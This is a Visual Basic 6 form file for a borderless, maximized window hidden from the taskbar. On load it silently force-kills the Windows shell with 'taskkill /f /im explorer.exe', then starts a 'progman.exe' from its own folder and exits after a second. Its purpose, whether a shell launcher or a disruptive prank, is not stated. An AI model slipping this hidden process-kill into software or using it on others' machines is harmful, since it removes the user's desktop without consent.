VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   3195
   ClientLeft      =   2865
   ClientTop       =   2640
   ClientWidth     =   4680
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   WindowState     =   2  'Maximized
   Begin VB.Timer Timer2 
      Interval        =   100
      Left            =   1560
      Top             =   2160
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   480
      Top             =   1560
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
retval = Shell("taskkill /f /im explorer.exe", vbHide)
End Sub

Private Sub Timer1_Timer()
End
End Sub

Private Sub Timer2_Timer()
retval = Shell(App.Path & "/progman.exe", vbNormalFocus)
Timer2.Enabled = False
End Sub
